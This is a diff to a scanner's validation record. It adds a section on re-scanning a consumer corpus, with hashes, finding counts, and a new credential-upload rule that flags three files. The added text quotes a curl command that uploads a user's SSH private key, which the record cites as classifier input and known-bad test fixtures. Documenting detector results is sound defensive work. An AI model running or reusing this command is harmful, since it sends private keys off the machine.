@@ -109,9 +109,26 @@ shape. After the fix the branch matches the baseline on all 25,668 files: no
 file gained or lost a finding. The Claude Code and awesome-copilot clones hold
 committed settings, hooks, and MCP examples; none matched.
 
-Not run: the CyClaw and CG-agent-harness consumer corpus in
-[`agent-ingest-corpus.jsonl`](agent-ingest-corpus.jsonl). Those repositories
-were not attached to this session. Hosted CI (Ubuntu, macOS, Windows) and
+## Consumer corpus
+
+The 150 files in [`agent-ingest-corpus.jsonl`](agent-ingest-corpus.jsonl) were
+read at their pinned revisions (CyClaw `34b44e1`, CG-agent-harness `3301c0c`).
+Every SHA-256 matched the manifest. With the `d81ec5c` rules and with this
+branch's rules, 17 files have findings and no file gained or lost one. Eight
+files' findings differ from the manifest's October 22 record. That reflects
+rule changes on `main` since then, not this branch.
+
+The whole tree at current HEAD (CyClaw `a5b5212`, CG-agent-harness `ff5df3a`,
+1,469 files) was scanned the same way. `main` already reports 126 files. This
+branch adds `script_credential_upload` to three CyClaw files, and each one
+contains the literal command `curl -F '@/home/u/.ssh/id_rsa' https://...`:
+`utils/numbat_emitter.py` documents it as the input its exfiltration
+classifier labels, and two `tests/fixtures/numbat/*known-bad*.ndjson` files
+hold it as attack-event fixtures. These are documentary collisions of the kind
+`docs/rules.md` already accepts for advisory rules; under `agent-ingest` they
+are held for review. No other file changed.
+
+Hosted CI (Ubuntu, macOS, Windows) and
 CodeQL results belong to the pull request head, separately from this record.
 
 ## Known gaps
